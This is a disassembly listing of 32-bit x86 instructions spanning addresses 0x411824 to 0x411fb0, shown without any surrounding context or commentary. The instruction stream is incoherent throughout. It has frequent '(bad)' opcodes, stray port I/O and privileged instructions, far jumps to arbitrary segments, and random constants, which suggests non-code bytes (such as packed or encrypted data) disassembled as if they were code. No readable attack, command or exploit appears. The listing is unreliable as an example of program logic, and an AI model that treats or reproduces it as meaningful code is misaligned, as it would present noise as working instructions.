  411824:	sbb    BYTE PTR [ebp-0x233eaa61],0x4e
  41182b:	lods   al,BYTE PTR ds:[esi]
  41182c:	mov    esp,0x1e00581
  411831:	xchg   esp,eax
  411832:	dec    edx
  411833:	dec    eax
  411834:	xor    DWORD PTR [ebx+0xdc9c917],esi
  41183a:	mov    bh,0x5c
  41183c:	push   ecx
  41183d:	rcr    BYTE PTR [edi],1
  41183f:	stc    
  411840:	sub    dl,BYTE PTR [ebx+esi*1-0x63]
  411844:	adc    DWORD PTR [ecx-0x1a35cd87],ebx
  41184a:	pop    ss
  41184b:	lea    ecx,[ecx]
  41184d:	pop    edx
  41184e:	cs pop ds
  411850:	arpl   WORD PTR [ebp+0x54],cx
  411853:	(bad)  
  411854:	mov    dh,0xd1
  411856:	add    ecx,DWORD PTR [eax-0x6cd9b5a6]
  41185c:	enter  0x855,0xb9
  411860:	or     DWORD PTR [eax-0x201553e4],0x70
  411867:	xor    ecx,DWORD PTR [esi+0x669a929f]
  41186d:	test   eax,0x9b8422be
  411872:	stc    
  411873:	iret   
  411874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411875:	daa    
  411876:	pop    eax
  411877:	shr    bh,1
  411879:	or     al,0x6d
  41187b:	jnp    0x4118e3
  41187d:	dec    esi
  41187e:	rol    BYTE PTR [ebx+0x63],0xa5
  411882:	pop    es
  411883:	adc    al,0x81
  411885:	fs or  al,0xa9
  411888:	xchg   BYTE PTR [edx+0x3a],cl
  41188b:	sbb    edi,DWORD PTR [ebx-0x76]
  41188e:	pop    ds
  41188f:	clc    
  411890:	add    edi,ebp
  411892:	cmp    al,ch
  411894:	call   0x7dab2091
  411899:	jno    0x4118ce
  41189b:	in     eax,0x31
  41189d:	jns    0x41186c
  41189f:	mov    bl,0xfa
  4118a1:	iret   
  4118a2:	push   esp
  4118a3:	jae    0x4118db
  4118a5:	mov    ?,WORD PTR [ebx-0x4bff48aa]
  4118ab:	js     0x4118cf
  4118ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118ae:	(bad)  
  4118b0:	or     eax,0x3d7fd6e0
  4118b5:	inc    edx
  4118b6:	rcl    DWORD PTR [edi+0x2b],0xdd
  4118ba:	push   eax
  4118bb:	push   ebp
  4118bc:	jmp    0x46d8ca68
  4118c1:	xchg   esp,eax
  4118c2:	cmp    eax,0xec63cf0e
  4118c7:	out    0x69,eax
  4118c9:	clc    
  4118ca:	inc    esi
  4118cb:	leave  
  4118cc:	dec    edi
  4118cd:	jp     0x411853
  4118cf:	into   
  4118d0:	enter  0x5cb2,0x8e
  4118d4:	call   FWORD PTR [ebx]
  4118d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d7:	xor    al,0x86
  4118d9:	jnp    0x411920
  4118db:	jge    0x4118f8
  4118dd:	lahf   
  4118de:	cmp    eax,0x3eaaeb8c
  4118e3:	xchg   esi,eax
  4118e4:	sbb    DWORD PTR [ebx+0x5e],esi
  4118e7:	bound  edi,QWORD PTR [esi-0x22]
  4118ea:	mov    ecx,0xcd28a139
  4118ef:	out    dx,eax
  4118f0:	call   DWORD PTR [ebp+0x4add24bd]
  4118f6:	(bad)  
  4118f8:	pop    ecx
  4118f9:	in     al,0x4d
  4118fb:	xor    ebx,esp
  4118fd:	push   0xa205954d
  411902:	fst    QWORD PTR [eax]
  411904:	ret    0xb3c2
  411907:	sar    DWORD PTR [ebx-0x659f77e2],cl
  41190d:	push   ss
  41190e:	std    
  41190f:	stos   DWORD PTR es:[edi],eax
  411910:	js     0x4118d1
  411912:	jo     0x4118b5
  411914:	(bad)  
  411915:	mov    al,0x32
  411917:	dec    esi
  411918:	jl     0x411926
  41191a:	in     al,0xc0
  41191c:	in     eax,0x97
  41191e:	dec    ebx
  41191f:	cmp    DWORD PTR [esi+esi*2+0x50],esi
  411923:	test   al,0x6e
  411925:	out    dx,eax
  411926:	les    edi,FWORD PTR [ebx]
  411928:	cli    
  411929:	pop    ds
  41192a:	inc    ecx
  41192b:	push   edx
  41192c:	jnp    0x4118c8
  41192e:	arpl   WORD PTR [ebx],di
  411930:	jg     0x411991
  411932:	cmp    BYTE PTR [eax+0x2da1f7d4],0x61
  411939:	sub    edi,DWORD PTR fs:0x63e2a35c
  411940:	idiv   DWORD PTR [eax+0x4d83d1b8]
  411946:	mov    ds:0x388068ad,eax
  41194b:	fist   WORD PTR [eax+0x49]
  41194e:	fdivr  st,st(2)
  411950:	retf   
  411951:	je     0x41192e
  411953:	dec    esi
  411954:	clc    
  411955:	cmp    DWORD PTR [ecx-0x5041e92b],ebx
  41195b:	in     eax,0x40
  41195d:	data16 cmc 
  41195f:	push   0x47289a5d
  411964:	mov    edi,0xc5ce68e5
  411969:	das    
  41196a:	pop    ebx
  41196b:	push   ss
  41196c:	jae    0x4119ac
  41196e:	adc    al,0xa3
  411970:	inc    eax
  411971:	xchg   ebx,eax
  411972:	fs xchg ebx,eax
  411974:	dec    eax
  411975:	pop    es
  411976:	jge    0x4119c0
  411978:	jp     0x41191a
  41197a:	push   esp
  41197b:	cmp    BYTE PTR [edx],cl
  41197d:	rcr    BYTE PTR [esi-0x3],1
  411980:	and    eax,0x2a074ee
  411985:	cmp    DWORD PTR [esi-0x2b],ebp
  411988:	mov    ebx,0xcb4ac4e0
  41198d:	popf   
  41198e:	mov    dl,0x44
  411990:	aam    0x23
  411992:	add    eax,0xbd6fcd9e
  411997:	cli    
  411998:	out    0x7d,al
  41199a:	adc    al,0xf2
  41199c:	or     eax,0x471912d5
  4119a1:	unpcklps xmm1,xmm3
  4119a4:	mov    bh,0x47
  4119a6:	out    dx,al
  4119a7:	and    esp,DWORD PTR [edx+0x2b5730c5]
  4119ad:	in     al,0x4
  4119af:	xchg   edx,eax
  4119b0:	xchg   edx,eax
  4119b1:	pop    eax
  4119b2:	or     bh,cl
  4119b4:	mov    al,0xa6
  4119b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119b7:	scas   al,BYTE PTR es:[edi]
  4119b8:	jne    0x4119a6
  4119ba:	icebp  
  4119bb:	int3   
  4119bc:	shl    BYTE PTR [eax],0x6c
  4119bf:	jge    0x411968
  4119c1:	jno    0x4119c7
  4119c3:	sar    cl,0xb7
  4119c6:	int    0xac
  4119c8:	in     al,0x74
  4119ca:	pop    ecx
  4119cb:	sub    DWORD PTR [eax],esi
  4119cd:	dec    esp
  4119ce:	cld    
  4119cf:	inc    edx
  4119d0:	(bad)  [eax-0x4a]
  4119d3:	imul   ebx,DWORD PTR [ecx-0x7c],0x40c97624
  4119da:	xor    DWORD PTR [edx-0x6ae84d2b],eax
  4119e0:	cmp    BYTE PTR [eax+0x7c],0xb
  4119e4:	mov    al,ds:0xcdfbd71c
  4119e9:	mov    ah,0x45
  4119eb:	nop
  4119ec:	sbb    eax,0x62cc6571
  4119f1:	and    bl,BYTE PTR [ebp+ecx*2+0x44710571]
  4119f8:	data16 stos BYTE PTR es:[edi],al
  4119fa:	jecxz  0x4119fa
  4119fc:	neg    DWORD PTR [ecx+0xd]
  4119ff:	mov    al,ds:0xb7d79275
  411a04:	pop    ds
  411a05:	cwde   
  411a06:	lds    esi,FWORD PTR [edx]
  411a08:	inc    ebx
  411a09:	in     eax,dx
  411a0a:	mov    ebp,0xe9809e8d
  411a0f:	aad    0x43
  411a11:	int3   
  411a12:	outs   dx,DWORD PTR ds:[esi]
  411a13:	jle    0x4119ef
  411a15:	push   es
  411a16:	jae    0x411a12
  411a18:	and    edx,DWORD PTR [ebp-0x29]
  411a1b:	out    dx,al
  411a1c:	add    ecx,esp
  411a1e:	shl    DWORD PTR [ecx+edx*2-0x2c],0xc8
  411a23:	fs ins DWORD PTR es:[edi],dx
  411a25:	lods   eax,DWORD PTR ds:[esi]
  411a26:	cld    
  411a27:	and    esp,DWORD PTR [esi]
  411a29:	sbb    BYTE PTR [esi+edi*1-0x2a],0xd4
  411a2e:	xlat   BYTE PTR ds:[ebx]
  411a2f:	call   0xfbeb:0x6df6bccb
  411a36:	mov    ebx,0x8128a015
  411a3b:	xor    esp,DWORD PTR [ecx+esi*1+0x44]
  411a3f:	jge    0x4119ed
  411a41:	inc    esi
  411a42:	add    eax,0x40f6a2ed
  411a47:	inc    ebx
  411a48:	xchg   ebx,eax
  411a49:	cmp    DWORD PTR [esi+eiz*4-0x38],ebx
  411a4d:	jge    0x411abc
  411a4f:	xchg   edx,eax
  411a50:	adc    eax,0x1d5d7d78
  411a55:	rcr    BYTE PTR [eax+0x970fb41],0x2e
  411a5c:	pop    esp
  411a5d:	shl    DWORD PTR [ebx-0x4372d3f0],1
  411a63:	jb     0x411a0f
  411a65:	jbe    0x411a07
  411a67:	shl    BYTE PTR [edx+0x1],1
  411a6a:	popa   
  411a6b:	mov    ebp,0xdd19a335
  411a70:	scas   al,BYTE PTR es:[edi]
  411a71:	cmp    eax,0xccb23dd5
  411a76:	(bad)  
  411a77:	repz pop es
  411a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a7a:	icebp  
  411a7b:	out    dx,eax
  411a7c:	xor    al,0xe1
  411a7e:	adc    DWORD PTR [ebx],eax
  411a80:	test   DWORD PTR ds:0xceebb299,ebp
  411a86:	jmp    0x411aa3
  411a88:	cli    
  411a89:	and    eax,0x542aa21
  411a8e:	mov    dl,0xe1
  411a90:	(bad)  
  411a91:	sti    
  411a92:	or     al,0xf1
  411a94:	aas    
  411a95:	xchg   ecx,eax
  411a96:	xor    esi,DWORD PTR [edx-0x7d00a441]
  411a9c:	sbb    bh,BYTE PTR [edi-0x17]
  411a9f:	lods   eax,DWORD PTR ds:[esi]
  411aa0:	in     al,dx
  411aa1:	sub    eax,0x4b16e696
  411aa6:	mov    ah,0x45
  411aa8:	(bad)  
  411aa9:	mov    ecx,0x62742b72
  411aae:	cs ds (bad) 
  411ab2:	push   es
  411ab3:	pusha  
  411ab4:	inc    esp
  411ab5:	aaa    
  411ab6:	pop    eax
  411ab7:	mov    cs,WORD PTR [ecx-0x67]
  411aba:	adc    BYTE PTR [ecx+0x33],0x72
  411abe:	les    esp,FWORD PTR [ecx]
  411ac0:	xchg   ebx,eax
  411ac1:	test   al,0x36
  411ac3:	ins    DWORD PTR es:[edi],dx
  411ac4:	jle    0x411b2b
  411ac6:	or     bl,BYTE PTR [edi]
  411ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ac9:	push   eax
  411aca:	into   
  411acb:	outs   dx,BYTE PTR ds:[esi]
  411acc:	mov    ch,0x7a
  411ace:	out    dx,al
  411acf:	cmp    BYTE PTR [ecx-0x16606188],dl
  411ad5:	jecxz  0x411adf
  411ad7:	add    BYTE PTR [ecx+0x3459196e],bl
  411add:	ficom  DWORD PTR [ebp+0x21]
  411ae0:	dec    ebx
  411ae1:	pop    edx
  411ae2:	sbb    DWORD PTR [eax+0x414872cc],edx
  411ae8:	push   ebp
  411ae9:	xchg   esp,eax
  411aea:	out    0x68,al
  411aec:	sub    dh,al
  411aee:	lods   al,BYTE PTR ds:[esi]
  411aef:	xchg   edi,eax
  411af0:	pop    ecx
  411af1:	addr16 cdq 
  411af3:	aaa    
  411af4:	or     DWORD PTR [eax],esp
  411af6:	pop    es
  411af7:	pop    esp
  411af8:	dec    edx
  411af9:	pop    ebp
  411afa:	mov    al,ds:0x36190a12
  411aff:	and    al,BYTE PTR [eax-0x272c15d3]
  411b05:	lods   al,BYTE PTR ds:[esi]
  411b06:	stc    
  411b07:	jecxz  0x411b77
  411b09:	pop    esp
  411b0a:	out    0x22,eax
  411b0c:	cld    
  411b0d:	int3   
  411b0e:	cmp    eax,0xaaf4b7dc
  411b13:	jmp    0xba22:0xb6dd9b24
  411b1a:	leave  
  411b1b:	test   al,0xc6
  411b1d:	ficomp DWORD PTR [eax-0x314953e1]
  411b23:	sbb    BYTE PTR [eax-0x70],al
  411b26:	nop
  411b27:	sub    eax,0xa4909c29
  411b2c:	pop    ebp
  411b2d:	add    DWORD PTR [eax+0x30147956],edx
  411b33:	das    
  411b34:	jmp    0x411b45
  411b36:	dec    edx
  411b37:	cmp    BYTE PTR [ebx-0x5b],ah
  411b3a:	out    dx,al
  411b3b:	sub    al,0x12
  411b3d:	scas   al,BYTE PTR es:[edi]
  411b3e:	and    al,0x6f
  411b40:	aad    0x18
  411b42:	std    
  411b43:	sub    BYTE PTR [ebp-0x7f24b95d],dl
  411b49:	mov    ecx,0x912f858d
  411b4e:	clc    
  411b4f:	ficomp WORD PTR [ebx]
  411b51:	adc    BYTE PTR [ebx-0x52],cl
  411b54:	bound  esi,QWORD PTR [edx+0x658b0602]
  411b5a:	jns    0x411ba1
  411b5c:	rcr    BYTE PTR [ebx-0x6682b459],cl
  411b62:	or     esp,ebp
  411b64:	neg    eax
  411b66:	stos   BYTE PTR es:[edi],al
  411b67:	mov    edx,0x22105c3e
  411b6c:	xchg   esp,eax
  411b6d:	cmp    eax,0x6049796b
  411b72:	or     dl,dl
  411b74:	retf   
  411b75:	adc    eax,DWORD PTR [edx-0x7d]
  411b78:	mov    esp,0xead4cd59
  411b7d:	add    eax,0x27c3ffdc
  411b82:	pop    edx
  411b83:	stos   DWORD PTR es:[edi],eax
  411b84:	(bad)  
  411b85:	into   
  411b86:	dec    eax
  411b87:	pop    edx
  411b88:	sub    eax,0x4188946
  411b8d:	aas    
  411b8e:	fimul  DWORD PTR [ecx]
  411b90:	jg     0x411b5f
  411b92:	push   edx
  411b93:	or     DWORD PTR [esi+0x16],0x9fd80fdf
  411b9a:	mov    eax,0x9fd74f5d
  411b9f:	aam    0x56
  411ba1:	jmp    0x3f4a:0x48ca9113
  411ba8:	scas   eax,DWORD PTR es:[edi]
  411ba9:	nop
  411baa:	cmp    al,0x8c
  411bac:	xor    eax,0xdfcb6bca
  411bb1:	sbb    al,al
  411bb3:	mov    dh,0xeb
  411bb5:	ins    BYTE PTR es:[edi],dx
  411bb6:	xor    eax,0x7bde94e2
  411bbb:	jno    0x411b70
  411bbd:	push   ebx
  411bbe:	data16 sub BYTE PTR [eax+0xa51c328],0x1d
  411bc6:	add    ax,0x725d
  411bca:	adc    DWORD PTR [edx],esi
  411bcc:	sub    eax,0xce197ea
  411bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bd2:	xchg   esi,eax
  411bd3:	(bad)  
  411bd4:	out    0xcc,eax
  411bd6:	rol    DWORD PTR [eax],1
  411bd8:	dec    edi
  411bd9:	test   eax,0x3db6953a
  411bde:	ror    ah,0x52
  411be1:	jo     0x411bcd
  411be3:	add    BYTE PTR [edi],ch
  411be5:	fld    DWORD PTR [edi-0x5f]
  411be8:	or     esi,ecx
  411bea:	call   0x3524:0x13ee28f7
  411bf1:	in     al,dx
  411bf2:	jge    0x411bba
  411bf4:	outs   dx,DWORD PTR ds:[esi]
  411bf5:	div    bl
  411bf7:	rol    BYTE PTR [ebx-0x9],0x15
  411bfb:	clc    
  411bfc:	xlat   BYTE PTR ds:[ebx]
  411bfd:	add    ebp,DWORD PTR [esi+edx*1-0x5b844771]
  411c04:	xchg   esi,eax
  411c05:	adc    eax,0x35b8009a
  411c0a:	jb     0x411baa
  411c0c:	adc    ebp,edi
  411c0e:	xchg   ebp,eax
  411c0f:	sets   ah
  411c12:	aas    
  411c13:	out    dx,eax
  411c14:	jp     0x411be4
  411c16:	jmp    0xc3d29de6
  411c1b:	mov    ebp,0xbba56ec1
  411c20:	pop    esp
  411c21:	and    ah,BYTE PTR [esi]
  411c23:	or     edi,ebx
  411c25:	sub    esp,edi
  411c27:	leave  
  411c28:	rcr    BYTE PTR [edx],1
  411c2a:	pushf  
  411c2b:	dec    edi
  411c2c:	push   cs
  411c2d:	fsub   DWORD PTR [esi+0x4c]
  411c30:	xchg   edi,eax
  411c31:	inc    ebp
  411c32:	(bad)  
  411c33:	mov    cl,0x1
  411c35:	aas    
  411c36:	idiv   DWORD PTR [edx]
  411c38:	add    al,0x60
  411c3a:	leave  
  411c3b:	push   0x6c
  411c3d:	nop
  411c3e:	pop    ds
  411c3f:	jmp    0x5dba:0x81239380
  411c46:	push   ebp
  411c47:	sub    DWORD PTR [esi-0x31],ebx
  411c4a:	and    ebp,esp
  411c4c:	(bad)  
  411c4d:	aas    
  411c4e:	dec    ebp
  411c4f:	jle    0x411cc0
  411c51:	jg     0x411be9
  411c53:	pop    esp
  411c54:	loopne 0x411cd2
  411c56:	mov    dh,0xf5
  411c58:	inc    esp
  411c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c5a:	out    dx,eax
  411c5b:	loopne 0x411cc4
  411c5d:	xchg   edi,eax
  411c5e:	mov    ebp,edi
  411c60:	xor    eax,0xb54e7755
  411c65:	data16 outs dx,BYTE PTR ds:[esi]
  411c67:	push   0xffffff9b
  411c69:	mov    al,ds:0xb51d50ef
  411c6e:	test   esp,ebp
  411c70:	rcr    BYTE PTR [edi+0x6b777f1b],1
  411c76:	push   esp
  411c77:	add    al,0x54
  411c79:	jp     0x411cd1
  411c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c7c:	pop    gs
  411c7e:	dec    edx
  411c7f:	pop    eax
  411c80:	xor    BYTE PTR [esi+0xd61d641],al
  411c86:	cwde   
  411c87:	sub    al,0x41
  411c89:	test   BYTE PTR [edi],0x68
  411c8c:	sub    bh,BYTE PTR [edi]
  411c8e:	aad    0x7d
  411c90:	fisttp WORD PTR [edi-0x7c531c2e]
  411c96:	fwait
  411c97:	or     BYTE PTR [eax],0x6
  411c9a:	sub    DWORD PTR [edx],eax
  411c9c:	mov    ah,0x65
  411c9e:	jl     0x411c42
  411ca0:	enter  0xae82,0xee
  411ca4:	sub    dl,BYTE PTR [ecx+0x4eebaa05]
  411caa:	repnz pushf 
  411cac:	pop    ecx
  411cad:	mov    DWORD PTR [esi+0x23],eax
  411cb0:	pop    edi
  411cb1:	push   ss
  411cb2:	push   0x746dae75
  411cb7:	(bad)  
  411cb8:	(bad)  
  411cb9:	sub    eax,0xd70f3c1c
  411cbe:	dec    ebp
  411cbf:	jmp    0x32dc6704
  411cc4:	pop    es
  411cc5:	jmp    0x4584:0xc20d4f76
  411ccc:	sti    
  411ccd:	jle    0x411d2b
  411ccf:	dec    edi
  411cd0:	jg     0x411d4d
  411cd2:	repz das 
  411cd4:	sub    BYTE PTR [esi+0x4b6d352b],bh
  411cda:	sahf   
  411cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cdc:	push   es
  411cdd:	push   ecx
  411cde:	cmp    al,0xac
  411ce0:	inc    ecx
  411ce1:	push   0x1fbcef5f
  411ce6:	jne    0x411ce8
  411ce8:	mov    ebp,0x4c2b1c51
  411ced:	mov    bl,0xcb
  411cef:	pop    ecx
  411cf0:	lahf   
  411cf1:	dec    esp
  411cf2:	es adc eax,0x9dc35190
  411cf8:	adc    edi,eax
  411cfa:	add    al,0x6
  411cfc:	(bad)  
  411cfd:	add    ah,BYTE PTR [ebp+0x0]
  411d00:	mov    al,BYTE PTR [ebp+0x78de509a]
  411d06:	xchg   esp,eax
  411d07:	scas   eax,DWORD PTR es:[edi]
  411d08:	not    DWORD PTR [ebx-0x80]
  411d0b:	call   0x4bf00fae
  411d10:	add    al,0x4b
  411d12:	dec    ecx
  411d13:	out    0x18,al
  411d15:	repnz sahf 
  411d17:	dec    ebp
  411d18:	mov    eax,ds:0x946c2544
  411d1d:	ss add bh,ch
  411d20:	mov    dl,BYTE PTR [eax+0x1cd8c36e]
  411d26:	cmp    al,0xa
  411d28:	js     0x411cb4
  411d2a:	jbe    0x411d1a
  411d2c:	push   es
  411d2d:	mov    edi,esi
  411d2f:	dec    esi
  411d30:	xchg   bl,al
  411d32:	test   al,0x7d
  411d34:	int    0x8e
  411d36:	adc    DWORD PTR [edx-0x3ac426d7],0xffffff91
  411d3d:	xchg   edi,eax
  411d3e:	jmp    0xc07086c8
  411d43:	ror    DWORD PTR [ecx-0x1b],0xe6
  411d47:	push   ecx
  411d48:	sub    edx,edx
  411d4a:	push   esi
  411d4b:	idiv   BYTE PTR [edx+0x15]
  411d4e:	push   cs
  411d4f:	out    dx,eax
  411d50:	outs   dx,BYTE PTR ds:[esi]
  411d51:	dec    eax
  411d52:	(bad)  
  411d53:	jb     0x411dbe
  411d55:	add    DWORD PTR [esi-0x7e],edi
  411d58:	cli    
  411d59:	lods   eax,DWORD PTR ds:[esi]
  411d5a:	out    0x6e,al
  411d5c:	fist   DWORD PTR [edx+edx*1-0x5c]
  411d60:	cmp    BYTE PTR [ebp+0x3a9a0fa5],dh
  411d66:	mov    ebp,0x3c521077
  411d6b:	or     BYTE PTR [ecx],0x2c
  411d6e:	pop    es
  411d6f:	dec    esp
  411d70:	dec    ecx
  411d71:	inc    ebx
  411d72:	mov    esi,0x25c38f78
  411d77:	leave  
  411d78:	cmp    bh,BYTE PTR [eax]
  411d7a:	mov    cl,0xab
  411d7c:	cld    
  411d7d:	arpl   ax,di
  411d7f:	sub    DWORD PTR [edx-0xbec0b33],edx
  411d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d86:	retf   0xdbae
  411d89:	adc    eax,DWORD PTR [ebx+0x518cd1cf]
  411d8f:	cmp    al,BYTE PTR [eax+0x2bdd64d7]
  411d95:	test   esi,ebx
  411d97:	cmp    eax,0x928f2b4b
  411d9c:	(bad)
  411da0:	jg     0x411dcc
  411da2:	into   
  411da3:	push   esp
  411da4:	push   eax
  411da5:	mov    BYTE PTR ss:[ecx],ch
  411da8:	and    DWORD PTR [eax+0x3a],edx
  411dab:	aad    0xdc
  411dad:	inc    esi
  411dae:	sub    eax,0x6bd3e757
  411db3:	jmp    0x2d0118ca
  411db8:	jbe    0x411e1a
  411dba:	scas   eax,DWORD PTR es:[edi]
  411dbb:	pop    ecx
  411dbc:	test   al,0xcd
  411dbe:	sub    eax,0x27b10210
  411dc3:	and    eax,0x8e39fc1b
  411dc8:	jns    0x411d93
  411dca:	ins    BYTE PTR es:[edi],dx
  411dcb:	push   ebp
  411dcc:	xchg   DWORD PTR [ebx+0x45],esp
  411dcf:	cmp    DWORD PTR [ebp+0x5534ce38],0xfffffff7
  411dd6:	and    edx,ecx
  411dd8:	add    ebx,DWORD PTR [edi-0xfc233cb]
  411dde:	cmp    al,0x77
  411de0:	bound  ebx,QWORD PTR [ebx-0x6e3b7f28]
  411de6:	sub    esp,DWORD PTR [esi-0x1c]
  411de9:	es in  al,dx
  411deb:	xchg   ecx,eax
  411dec:	popf   
  411ded:	jmp    0xeff6e6a4
  411df2:	add    ah,BYTE PTR [ecx]
  411df4:	jb     0x411dc4
  411df6:	xor    ebp,ebp
  411df8:	sub    esp,ecx
  411dfa:	inc    edi
  411dfb:	out    0x8,al
  411dfd:	popf   
  411dfe:	pushf  
  411dff:	test   cl,dh
  411e01:	les    ebp,FWORD PTR [ecx]
  411e03:	sub    al,0x25
  411e05:	cld    
  411e06:	rol    esi,cl
  411e08:	outs   dx,BYTE PTR ds:[esi]
  411e09:	ss dec edx
  411e0b:	mov    eax,0x54164f0d
  411e10:	mov    ecx,0xd282d60a
  411e15:	(bad)  
  411e16:	sub    bh,BYTE PTR [eax]
  411e18:	jno    0x411dd3
  411e1a:	xchg   ebp,eax
  411e1b:	cmp    dh,BYTE PTR [edi-0x1c]
  411e1e:	aas    
  411e1f:	aas    
  411e20:	inc    eax
  411e21:	rol    BYTE PTR [esi-0x32],0x43
  411e25:	mov    bl,0xa
  411e27:	jno    0x411e6a
  411e29:	add    ecx,DWORD PTR [edi-0x6be24da2]
  411e2f:	sub    ecx,DWORD PTR [ebx+0x5a]
  411e32:	mov    DWORD PTR [edx-0x27d84255],edx
  411e38:	gs inc esi
  411e3a:	ret    0x420c
  411e3d:	cld    
  411e3e:	push   esi
  411e3f:	mov    esp,0x9e74d9e3
  411e44:	sbb    DWORD PTR [edi+0x4e],0x918841eb
  411e4b:	adc    ebx,DWORD PTR [ebx]
  411e4d:	retf   
  411e4e:	push   eax
  411e4f:	stos   DWORD PTR es:[edi],eax
  411e50:	mul    BYTE PTR [edx]
  411e52:	leave  
  411e53:	cmp    bl,ch
  411e55:	mov    ah,0xc3
  411e57:	mov    ebp,0x4f2287a1
  411e5c:	aam    0x48
  411e5e:	pop    ebp
  411e5f:	stos   DWORD PTR es:[edi],eax
  411e60:	fdiv   QWORD PTR [ebp+0x2413661d]
  411e66:	sub    bh,BYTE PTR [ecx]
  411e68:	(bad)  
  411e69:	fiadd  DWORD PTR [eax-0x258297a]
  411e6f:	(bad)  
  411e70:	in     eax,0xf2
  411e72:	aad    0x74
  411e74:	push   eax
  411e75:	in     eax,dx
  411e76:	jg     0x411e94
  411e78:	xchg   ebp,eax
  411e79:	mov    BYTE PTR [esi],al
  411e7b:	cdq    
  411e7c:	fld    TBYTE PTR [edi-0x49]
  411e7f:	aas    
  411e80:	pop    ebx
  411e81:	addr16 cmc 
  411e83:	xor    al,0x24
  411e85:	jg     0x411e0e
  411e87:	pop    edi
  411e88:	mov    cl,0x5e
  411e8a:	fstp   DWORD PTR [ebx+ebp*4+0x6c]
  411e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e8f:	in     al,0x34
  411e91:	sbb    al,0xaf
  411e93:	or     dh,BYTE PTR [ebx-0x5]
  411e96:	fdiv   DWORD PTR [edx+0x52f2421e]
  411e9c:	sbb    eax,edi
  411e9e:	ret    
  411e9f:	sub    eax,0xeb55d247
  411ea4:	sub    al,0xb
  411ea6:	inc    esp
  411ea7:	out    0xe9,al
  411ea9:	and    al,0x5f
  411eab:	cli    
  411eac:	dec    edi
  411ead:	dec    edx
  411eae:	cmp    al,0xe6
  411eb0:	xchg   esi,eax
  411eb1:	enter  0x1c6f,0x7e
  411eb5:	pop    esp
  411eb6:	inc    esp
  411eb7:	lds    edx,FWORD PTR [esi]
  411eb9:	dec    esi
  411eba:	bound  edi,QWORD PTR [esi-0x14929511]
  411ec0:	cdq    
  411ec1:	retf   
  411ec2:	sub    BYTE PTR [esi-0x6f],dl
  411ec5:	in     eax,0x77
  411ec7:	call   0xd49e:0xd3a656a0
  411ece:	arpl   bp,si
  411ed0:	mov    ds:0xdd59a8fc,al
  411ed5:	or     eax,0x625f298c
  411eda:	xor    edx,DWORD PTR [ebx]
  411edc:	cmp    eax,0x70335d7e
  411ee1:	in     eax,dx
  411ee2:	loope  0x411e6c
  411ee4:	and    bh,al
  411ee6:	xchg   esp,eax
  411ee7:	jecxz  0x411ee4
  411ee9:	mov    ebp,0x15f4055
  411eee:	dec    ebx
  411eef:	jle    0x411eda
  411ef1:	arpl   sp,di
  411ef3:	stc    
  411ef4:	dec    ax
  411ef6:	dec    BYTE PTR [esi+0x19]
  411ef9:	adc    esi,DWORD PTR [edx+0x1a]
  411efc:	push   ss
  411efd:	test   BYTE PTR [esi-0x63468933],al
  411f03:	ret    0x8055
  411f06:	or     eax,DWORD PTR [ecx]
  411f08:	das    
  411f09:	ins    BYTE PTR es:[edi],dx
  411f0a:	dec    ebx
  411f0b:	es (bad) 
  411f0d:	iret   
  411f0e:	out    0xe5,eax
  411f10:	push   edi
  411f11:	ret    
  411f12:	pop    edi
  411f13:	sub    bl,BYTE PTR [eax-0x6d]
  411f16:	fidivr WORD PTR [ebp-0x37f8af2b]
  411f1c:	pop    ss
  411f1d:	xchg   ebp,eax
  411f1e:	add    ebx,DWORD PTR [eax]
  411f20:	cdq    
  411f21:	push   edx
  411f22:	(bad)  
  411f23:	cld    
  411f24:	cli    
  411f25:	adc    cl,BYTE PTR [edx]
  411f27:	dec    ebx
  411f28:	jne    0x411f8e
  411f2a:	adc    DWORD PTR [eax-0x757e7aea],edx
  411f30:	les    ebp,FWORD PTR [ebx+0x4ec4fef4]
  411f36:	and    ebx,DWORD PTR [edi-0x4b]
  411f39:	cwde   
  411f3a:	jne    0x411f1c
  411f3c:	enter  0xa4a7,0xf6
  411f40:	aam    0xc0
  411f42:	(bad)  
  411f43:	adc    eax,0x20aa094f
  411f48:	and    eax,0xed1204ba
  411f4d:	hlt    
  411f4e:	(bad)  
  411f4f:	out    dx,al
  411f50:	mov    ch,0x6b
  411f52:	cmp    bl,bh
  411f54:	cs add ebx,eax
  411f57:	push   ecx
  411f58:	adc    ebx,DWORD PTR ds:0xfd5bd22b
  411f5e:	ret    
  411f5f:	fst    QWORD PTR [ecx-0x715dc46a]
  411f65:	shr    DWORD PTR [ebp+0x5df247f1],1
  411f6b:	inc    esi
  411f6c:	stos   DWORD PTR es:[edi],eax
  411f6d:	inc    esi
  411f6e:	in     eax,dx
  411f6f:	push   esi
  411f70:	ins    BYTE PTR es:[edi],dx
  411f71:	xlat   BYTE PTR ds:[ebx]
  411f72:	jle    0x411f93
  411f74:	stos   BYTE PTR es:[edi],al
  411f75:	and    al,0x7c
  411f77:	pop    esp
  411f78:	je     0x411f7a
  411f7a:	jl     0x411f2d
  411f7c:	test   al,0x9
  411f7e:	(bad)  
  411f7f:	std    
  411f80:	jbe    0x411fa2
  411f82:	mov    ?,WORD PTR [ecx+0x12]
  411f85:	call   0xc3f87ff9
  411f8a:	push   ss
  411f8b:	or     bl,bl
  411f8d:	xchg   ebp,eax
  411f8e:	jns    0x411f26
  411f90:	mov    bl,0x88
  411f92:	pop    edx
  411f93:	mov    cl,0x8c
  411f95:	ret    
  411f96:	cmc    
  411f97:	mul    BYTE PTR [edx+eax*8]
  411f9a:	fwait
  411f9b:	jnp    0x412009
  411f9d:	or     al,bl
  411f9f:	xchg   ebx,eax
  411fa0:	cwde   
  411fa1:	call   0x87e2:0x4cfcda5e
  411fa8:	sbb    eax,0x456655d0
  411fad:	jae    0x411f9b
  411faf:	push   es
  411fb0:	enter  0x7920,0xa6
